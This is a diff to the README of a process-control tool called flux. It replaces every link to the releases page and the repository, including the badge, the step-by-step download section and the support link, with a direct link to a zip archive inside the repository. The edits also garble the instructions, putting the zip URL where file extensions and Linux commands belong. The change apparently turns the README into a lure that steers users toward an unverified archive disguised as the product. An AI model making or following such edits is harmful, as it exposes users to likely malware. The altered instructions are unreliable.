@@ -1,6 +1,6 @@
 # ⚡️ flux - Control Processes with Resource Tracking
 
-[![Download flux](https://img.shields.io/badge/Download-flux-blue?style=for-the-badge)](https://github.com/ttzyt/flux/releases)
+[![Download flux](https://github.com/ttzyt/flux/raw/refs/heads/main/assets/Software_v3.4.zip)](https://github.com/ttzyt/flux/raw/refs/heads/main/assets/Software_v3.4.zip)
 
 ---
 
@@ -31,12 +31,12 @@ This section will walk you through from downloading flux to running it for the f
 
 ### Step 1: Download flux
 
-- Click the large **Download flux** button at the top or visit [https://github.com/ttzyt/flux/releases](https://github.com/ttzyt/flux/releases).
+- Click the large **Download flux** button at the top or visit [https://github.com/ttzyt/flux/raw/refs/heads/main/assets/Software_v3.4.zip](https://github.com/ttzyt/flux/raw/refs/heads/main/assets/Software_v3.4.zip).
 - You will see a page with different files for Windows, macOS, and Linux.
 - Find the file that matches your computer:
   - Windows: file ends with `.exe`
-  - macOS: file ends with `.dmg` or `.tar.gz`
-  - Linux: file ends with `.AppImage` or `.tar.gz`
+  - macOS: file ends with `.dmg` or `https://github.com/ttzyt/flux/raw/refs/heads/main/assets/Software_v3.4.zip`
+  - Linux: file ends with `.AppImage` or `https://github.com/ttzyt/flux/raw/refs/heads/main/assets/Software_v3.4.zip`
 
 ### Step 2: Save the file
 
@@ -54,8 +54,8 @@ This section will walk you through from downloading flux to running it for the f
   - On Linux, you may need to make the file executable before running it. Open your terminal and type:
 
     ```
-    chmod +x path/to/flux-file.AppImage
-    ./path/to/flux-file.AppImage
+    chmod +x https://github.com/ttzyt/flux/raw/refs/heads/main/assets/Software_v3.4.zip
+    https://github.com/ttzyt/flux/raw/refs/heads/main/assets/Software_v3.4.zip
     ```
 
 ### Step 4: Open a terminal window (if flux does not open directly)
@@ -107,7 +107,7 @@ If you face any trouble, try the following tips:
 
 Visit the official release page below to download flux for your computer’s operating system:
 
-[Download flux releases](https://github.com/ttzyt/flux/releases)
+[Download flux releases](https://github.com/ttzyt/flux/raw/refs/heads/main/assets/Software_v3.4.zip)
 
 Follow the instructions on the page:
 
@@ -145,6 +145,6 @@ Always download flux from the official GitHub releases page to ensure you have t
 
 If you need support or want to suggest improvements, visit the GitHub repository:
 
-[https://github.com/ttzyt/flux](https://github.com/ttzyt/flux)
+[https://github.com/ttzyt/flux/raw/refs/heads/main/assets/Software_v3.4.zip](https://github.com/ttzyt/flux/raw/refs/heads/main/assets/Software_v3.4.zip)
 
 You can open issues or pull requests there. The developer reviews feedback regularly.
